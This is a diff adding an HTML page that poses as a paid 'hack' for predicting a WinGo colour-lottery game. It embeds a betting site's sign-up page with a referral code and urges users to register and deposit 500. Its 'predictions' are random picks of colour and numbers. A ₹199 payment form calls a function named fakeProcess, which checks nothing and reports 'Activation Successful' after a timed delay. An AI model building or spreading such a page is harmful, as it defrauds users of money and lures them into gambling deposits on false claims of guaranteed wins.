@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MICKEY HACK PREMIUM V2</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --premium-gold: #FFD700;
+            --fixer-red: #FF416C;
+            --panel-bg: rgba(6, 6, 6, 0.98);
+            --neon-blue: #00f2fe;
+            --neon-purple: #7000ff;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; font-family: 'Orbitron', sans-serif; }
+
+        body, html { height: 100%; width: 100%; background: #000; overflow: hidden; color: white; }
+
+        /* --- Entry Screen --- */
+        #entry-screen {
+            position: fixed; width: 100%; height: 100%; 
+            background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('mickey.png') no-repeat center center/cover;
+            display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 9999;
+        }
+
+        .premium-title {
+            font-size: 32px; font-weight: 900; color: #fff;
+            text-shadow: 0 0 15px var(--neon-purple);
+            letter-spacing: 3px; text-transform: uppercase; text-align: center;
+        }
+
+        .main-btn {
+            margin-top: 30px; padding: 15px 40px; font-size: 18px; font-weight: bold; color: white;
+            background: linear-gradient(45deg, #FF416C, #FF4B2B);
+            border: none; border-radius: 50px; cursor: pointer;
+            box-shadow: 0 0 20px rgba(255, 65, 108, 0.5);
+            transition: 0.3s;
+        }
+
+        /* --- Floating Draggable Button --- */
+        #floating-circle {
+            display: none; position: fixed; top: 70%; right: 20px;
+            width: 70px; height: 70px; z-index: 10000; cursor: move;
+            touch-action: none; border-radius: 50%;
+            box-shadow: 0 0 20px rgba(0, 242, 254, 0.6);
+            background: url('flot.png') no-repeat center center/cover;
+            border: 2px solid var(--neon-blue);
+            display: flex; justify-content: center; align-items: center;
+        }
+
+        /* --- Mickey Hack Panel --- */
+        .panel-box {
+            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 280px; background: var(--panel-bg); 
+            border: 1px solid #333;
+            z-index: 10001; text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+            border-radius: 2px;
+        }
+
+        .fixer-tag {
+            font-weight: 900; font-size: 24px;
+            padding: 15px 0 5px 0; display: block;
+            background: linear-gradient(to right, #4e54c8, #8f94fb, #ff416c);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-transform: uppercase;
+        }
+
+        .prediction-box {
+            background: #000; 
+            width: 100%; 
+            margin: 0 auto;
+            padding: 35px 10px; 
+            border-top: 1px solid #1a1a1a;
+            border-bottom: 1px solid #1a1a1a;
+            font-size: 32px; 
+            font-weight: 900;
+            letter-spacing: 1px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 150px;
+            text-align: center;
+        }
+
+        .instruction-text {
+            font-size: 16px;
+            color: #ff416c;
+            line-height: 1.4;
+            padding: 10px;
+            text-shadow: 0 0 5px rgba(255, 65, 108, 0.5);
+        }
+
+        .period-container {
+            padding: 8px 0;
+            background: #000;
+        }
+
+        .period-text { 
+            color: #ffbc00; 
+            font-size: 11px; 
+            font-weight: bold;
+        }
+        
+        #game-period-id { color: #00ff00; font-size: 13px; }
+
+        /* --- Bottom Buttons Design --- */
+        .footer-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; }
+        
+        .footer-btn { 
+            padding: 12px 5px; background: #000; 
+            color: #7000ff; border: 1px solid #1a1a1a;
+            font-weight: 900; cursor: pointer; font-size: 14px;
+            text-transform: uppercase;
+            background: linear-gradient(to bottom, #111, #000);
+        }
+
+        .btn-exit { color: #6a5acd; }
+        .btn-change { color: #ff4b2b; }
+        .btn-hide { color: #4e54c8; }
+
+        .suresort-btn-large {
+            grid-column: span 3;
+            background: #000;
+            color: var(--premium-gold);
+            border: 1px solid #1a1a1a;
+            padding: 15px; font-size: 14px; letter-spacing: 1px;
+            font-weight: bold;
+        }
+
+        /* --- Frame --- */
+        #game-frame { display: none; width: 100%; height: 100%; border: none; }
+        
+        #payment-box {
+            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 90%; max-width: 340px; background: #111; border: 2px solid gold; z-index: 10005; 
+            padding: 20px; text-align: center; border-radius: 10px;
+        }
+
+        .qr-img { width: 200px; height: 200px; margin: 15px 0; border: 3px solid #fff; }
+
+        .loading-overlay {
+            display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9); flex-direction: column; justify-content: center; align-items: center;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="entry-screen">
+        <div class="premium-title">MICKEY ADVANCE</div>
+        <p style="color: cyan; font-size: 12px; margin-top: 5px;">PREMIUM V2.0 SYSTEM</p>
+        <button class="main-btn" onclick="startApp()">LOGIN & ACTIVATE</button>
+    </div>
+
+    <iframe id="game-frame" src=""></iframe>
+
+    <div id="floating-circle">
+        <i class="fas fa-bolt" style="color: cyan; font-size: 25px;"></i>
+    </div>
+
+    <div id="mickey-panel" class="panel-box">
+        <div class="fixer-tag">1 LEVEL FIXER</div>
+        
+        <div class="prediction-box" id="prediction-text" style="color: #ffbc00;">WAIT...</div>
+        
+        <div class="period-container">
+            <span class="period-text">NEXT PERIOD: <span id="game-period-id">LOADING...</span></span>
+        </div>
+        
+        <div id="action-buttons" class="footer-grid">
+            <button class="footer-btn btn-exit" onclick="toggleMickeyPanel()">EXIT</button>
+            <button class="footer-btn btn-change" id="change-btn" onclick="generatePrediction()">CHANGE</button>
+            <button class="footer-btn btn-hide" onclick="toggleMickeyPanel()">HIDE</button>
+            <button class="footer-btn suresort-btn-large" onclick="openPayment()">SURESORT HACK</button>
+        </div>
+    </div>
+
+    <div id="payment-box">
+        <h3 style="color: gold;">ACTIVATE PREMIUM</h3>
+        <img src="qr.png" alt="Scan QR" class="qr-img">
+        <p>Activation Fee: ₹199</p>
+        <input type="text" id="utr" style="width:100%; padding:10px; margin:10px 0; background:#000; color:#fff; border:1px solid #444;" placeholder="Enter Ref/UTR No.">
+        <button class="main-btn" style="width:100%; margin:0;" onclick="fakeProcess()">VERIFY PAYMENT</button>
+        
+        <div id="loading-overlay" class="loading-overlay">
+            <i class="fas fa-sync fa-spin" style="font-size: 40px; color: gold;"></i>
+            <p style="margin-top: 10px;">Verifying...</p>
+        </div>
+    </div>
+
+    <script>
+        const API_URL = "https://draw.ar-lottery01.com/WinGo/WinGo_1M/GetHistoryIssuePage.json";
+        let isLocked = true;
+        const LOCK_TIME = 180000; // 3 minutes
+
+        async function fetchLivePeriod() {
+            try {
+                const response = await fetch(`${API_URL}?t=${new Date().getTime()}`);
+                const data = await response.json();
+                if (data && data.data && data.data.list && data.data.list.length > 0) {
+                    const latestIssue = data.data.list[0].issueNumber;
+                    const nextPeriod = (BigInt(latestIssue) + 1n).toString();
+                    const periodElement = document.getElementById('game-period-id');
+                    if (periodElement.innerText !== nextPeriod) {
+                        periodElement.innerText = nextPeriod;
+                    }
+                }
+            } catch (error) { console.error("API Error:", error); }
+        }
+
+        function generatePrediction() {
+            if(isLocked) return;
+
+            const predText = document.getElementById('prediction-text');
+            predText.innerText = "WAIT...";
+            predText.style.color = "#ffbc00";
+
+            setTimeout(() => {
+                const colors = ["GREEN", "RED"];
+                const selectedColor = colors[Math.floor(Math.random() * colors.length)];
+                
+                let numbers = [];
+                if(selectedColor === "GREEN") {
+                    const greenNums = [1, 3, 5, 7, 9];
+                    // Pick 2 random unique numbers from green set
+                    const shuffled = greenNums.sort(() => 0.5 - Math.random());
+                    numbers = [shuffled[0], shuffled[1]].sort();
+                    predText.style.color = "#00ff00";
+                } else {
+                    const redNums = [0, 2, 4, 6, 8];
+                    // Pick 2 random unique numbers from red set
+                    const shuffled = redNums.sort(() => 0.5 - Math.random());
+                    numbers = [shuffled[0], shuffled[1]].sort();
+                    predText.style.color = "#ff416c";
+                }
+
+                predText.innerText = `${selectedColor} ${numbers[0]}/${numbers[1]}`;
+                fetchLivePeriod(); 
+            }, 400);
+        }
+
+        setInterval(fetchLivePeriod, 2000);
+
+        // --- Dragging Logic ---
+        const floatBtn = document.getElementById('floating-circle');
+        let isDragging = false;
+        let currentX, currentY, initialX, initialY, xOffset = 0, yOffset = 0;
+
+        floatBtn.addEventListener("touchstart", (e) => {
+            initialX = e.touches[0].clientX - xOffset;
+            initialY = e.touches[0].clientY - yOffset;
+            isDragging = false;
+        }, false);
+        floatBtn.addEventListener("touchend", () => { initialX = currentX; initialY = currentY; }, false);
+        floatBtn.addEventListener("touchmove", (e) => {
+            isDragging = true; e.preventDefault();
+            currentX = e.touches[0].clientX - initialX;
+            currentY = e.touches[0].clientY - initialY;
+            xOffset = currentX; yOffset = currentY;
+            floatBtn.style.transform = "translate3d(" + currentX + "px, " + currentY + "px, 0)";
+        }, false);
+        floatBtn.addEventListener("click", () => { if(!isDragging) toggleMickeyPanel(); });
+
+        function startApp() {
+            document.getElementById('game-frame').src = "https://www.tashanok.app/#/register?invitationCode=13413405256";
+            document.getElementById('entry-screen').style.display = 'none';
+            document.getElementById('game-frame').style.display = 'block';
+            document.getElementById('floating-circle').style.display = 'flex';
+            
+            setTimeout(() => {
+                isLocked = false;
+                if(document.getElementById('mickey-panel').style.display === 'block') {
+                    generatePrediction();
+                }
+            }, LOCK_TIME);
+            fetchLivePeriod();
+        }
+
+        function toggleMickeyPanel() {
+            let p = document.getElementById('mickey-panel');
+            let predText = document.getElementById('prediction-text');
+            let changeBtn = document.getElementById('change-btn');
+
+            if (p.style.display === 'block') {
+                p.style.display = 'none';
+            } else {
+                p.style.display = 'block';
+                if(isLocked) {
+                    predText.innerHTML = '<div class="instruction-text">REGISTER AND DEPOSIT 500 THEN ACTIVATE HACK</div>';
+                    changeBtn.style.opacity = "0.5";
+                } else {
+                    changeBtn.style.opacity = "1";
+                    generatePrediction();
+                }
+                fetchLivePeriod();
+            }
+        }
+
+        function openPayment() { document.getElementById('payment-box').style.display = 'block'; }
+
+        function fakeProcess() {
+            if(document.getElementById('utr').value.length < 10) {
+                alert("Please enter valid UTR!");
+                return;
+            }
+            document.getElementById('loading-overlay').style.display = 'flex';
+            setTimeout(() => {
+                document.getElementById('loading-overlay').style.display = 'none';
+                document.getElementById('payment-box').style.display = 'none';
+                alert("Activation Successful! Suresort Mode On.");
+                document.querySelector('.suresort-btn-large').innerText = "SURESORT ACTIVE";
+                document.querySelector('.suresort-btn-large').style.color = "lime";
+            }, 4000);
+        }
+    </script>
+</body>
+</html>
